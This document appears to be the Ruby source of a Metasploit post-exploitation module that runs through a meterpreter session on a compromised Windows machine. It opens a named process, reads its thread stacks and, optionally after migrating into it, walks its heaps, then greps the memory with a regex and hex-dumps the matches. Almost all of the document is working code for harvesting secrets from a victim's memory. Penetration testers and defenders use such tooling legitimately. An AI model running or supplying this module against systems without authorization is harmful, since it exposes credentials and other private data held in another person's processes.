##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Process Memory Grep',
        'Description' => %q{
          This module allows for searching the memory space of a process for potentially
          sensitive data.  Please note: When the HEAP option is enabled, the module will have
          to migrate to the process you are grepping, and will not migrate back automatically.
          This means that if the user terminates the application after using this module, you
          may lose your session.
        },
        'License' => MSF_LICENSE,
        'Author' => ['bannedit'],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_migrate
              stdapi_railgun_api
              stdapi_sys_process_attach
              stdapi_sys_process_getpid
              stdapi_sys_process_memory_query
              stdapi_sys_process_memory_read
              stdapi_sys_process_thread_open
            ]
          }
        }
      )
    )
    register_options([
      OptString.new('PROCESS', [true, 'Name of the process to dump memory from', nil]),
      OptRegexp.new('REGEX', [true, 'Regular expression to search for with in memory', nil]),
      OptBool.new('HEAP', [false, 'Grep from heap', false])
    ])
  end

  def get_data_from_stack(target_pid)
    proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
    stack = []
    begin
      proc.thread.each_thread do |tid|
        thread = proc.thread.open(tid)
        esp = thread.query_regs['esp']
        addr = proc.memory.query(esp)
        vprint_status("Found Thread TID: #{tid}\tBaseAddress: 0x%08x\t\tRegionSize: %d bytes" % [addr['BaseAddress'], addr['RegionSize']])
        data = proc.memory.read(addr['BaseAddress'], addr['RegionSize'])
        stack << {
          'Address' => addr['BaseAddress'],
          'Size' => addr['RegionSize'],
          'Handle' => thread.handle,
          'Data' => data
        }
      end
    rescue StandardError => e
      vprint_error(e.message)
    end

    stack
  end

  def get_data_from_heap(target_pid)
    # we need to be inside the process to walk the heap using railgun
    heap = []
    if target_pid != client.sys.process.getpid
      print_status("Migrating into #{target_pid} to allow for dumping heap data")
      session.core.migrate(target_pid)
    end
    proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)

    heap_cnt = session.railgun.kernel32.GetProcessHeaps(nil, nil)['return']
    dheap = session.railgun.kernel32.GetProcessHeap()['return']
    vprint_status('Default Process Heap: 0x%08x' % dheap)
    ret = session.railgun.kernel32.GetProcessHeaps(heap_cnt, heap_cnt * 4)
    pheaps = ret['ProcessHeaps']

    idx = 0
    handles = []
    while idx != pheaps.length
      vprint_status('Found Heap: 0x%08x' % pheaps[idx, 4].unpack('V')[0])
      handles << pheaps[idx, 4].unpack('V')[0]
      idx += 4
    end

    print_status('Walking the heap... this could take some time')
    heap = []
    handles.each do |handle|
      lpentry = "\x00" * 42
      ret = ''
      while (ret = session.railgun.kernel32.HeapWalk(handle, lpentry)) && ret['return']
        entry = ret['lpEntry'][0, 4].unpack('V')[0]
        proc.memory.read(entry, 512)
        size = ret['lpEntry'][4, 4].unpack('V')[0]
        data = proc.memory.read(entry, (size == 0) ? 1048576 : size)
        if !data.empty?
          heap << {
            'Address' => entry,
            'Size' => data.length,
            'Handle' => handle,
            'Data' => data
          }
        end
        lpentry = ret['lpEntry']
        break if (ret['GetLastError'] == 259) || (size == 0)
      end
    end

    heap
  end

  def dump_data(target_pid)
    regex = datastore['REGEX']

    get_data_from_stack(target_pid).each do |mem|
      idx = mem['Data'].index(regex)

      next if idx.nil?

      print_status('Match found on stack!')
      print_line
      data = mem['Data'][idx, 512]
      addr = mem['Address'] + idx
      print_line(Rex::Text.to_hex_dump(data, 16, addr))
    end

    # Grep from heap is optional.  If the 'HEAP' option isn't set,
    # then let's bail.
    return unless datastore['HEAP']

    get_data_from_heap(target_pid).each do |mem|
      idx = mem['Data'].index(regex)

      next if idx.nil?

      print_status('Match found on heap!')
      print_line
      data = mem['Data'][idx, 512]
      addr = mem['Address'] + idx
      print_line(Rex::Text.to_hex_dump(data, 16, addr))
    end
  end

  def run
    if session.type != 'meterpreter'
      print_error 'Only meterpreter sessions are supported by this post module'
      return
    end

    print_status("Running module against #{sysinfo['Computer']}")

    proc_name = datastore['PROCESS']

    # Collect PIDs
    pids = []
    client.sys.process.processes.each do |p|
      pids << p['pid'] if p['name'] == proc_name
    end

    if pids.empty?
      print_error("No PID found for #{proc_name}")
      return
    end

    print_status("PIDs found for #{proc_name}: #{pids * ', '}")

    pids.each do |pid|
      print_status("Searching in process: #{pid}...")
      dump_data(pid)
      print_line
    end
  end
end
